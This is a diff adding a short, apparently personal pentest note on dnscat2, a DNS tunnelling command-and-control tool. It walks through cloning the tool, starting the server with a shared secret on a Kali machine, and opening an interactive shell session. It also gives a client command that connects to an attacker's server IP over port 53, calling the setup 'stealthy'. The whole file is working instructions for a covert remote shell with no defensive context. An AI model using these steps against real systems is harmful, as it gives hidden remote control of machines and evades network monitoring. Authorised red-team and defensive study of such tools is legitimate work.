@@ -1,0 +1,49 @@
+DNSCAT
+First we need to set up a server
+
+Download the github repo for DNSCat
+
+https://github.com/iagox86/dnscat2
+
+or 
+
+git clone https://github.com/iagox86/dnscat2.git
+
+Server Side
+
+Make sure that either your domain is set up (stealthy) or you have all your port forwarding set up to get connections from the outside world
+
+root@kali# ruby2.5 dnscat2.rb --secret 752891347958625
+
+MAKE SURE THAT YOU ARE NOT USING OLD FUCKING RUBY - IT WILL THROW ERRORS - Ruby 2.3 and 2.5 work. AND ALSO MAKE SURE YOU ARE IN THE SERVER DIRECTORY, EXECUTING THE SERVER RUBY SCRIPT, E.G., /pentest/pivoting/dnscat2/server/dnscat2.rb
+
+Once a connection is made, 
+
+Type the command "windows" --without the quote.  This will show all open windows.
+
+Now type in "window 1" window 1 will be the very first window you get after the initial connection to the client from the server AKA attacker machine
+
+Now when in "window 1", type the command "shell" 
+
+Now press ctrl + z and this will take you back to the main screen.
+
+Once in the main screen, type the command "windows" and you should see a list of windows.  The window that says something like "4 :: sh (thp3) [encrypted and verified] [*]"
+
+In this instance 4 is the window and sh is the fact I am running a shell on the box.
+
+type window -i 4
+
+Now you have shell access through DNS :):):):)
+
+
+
+
+Client Side
+
+For the client side, execute the following, replace the x.x.x.x with your server IP address, or domain name.
+
+dnscat --dns server=x.x.x.x,port=53 --secret=752891347958625
+
+windows
+
+
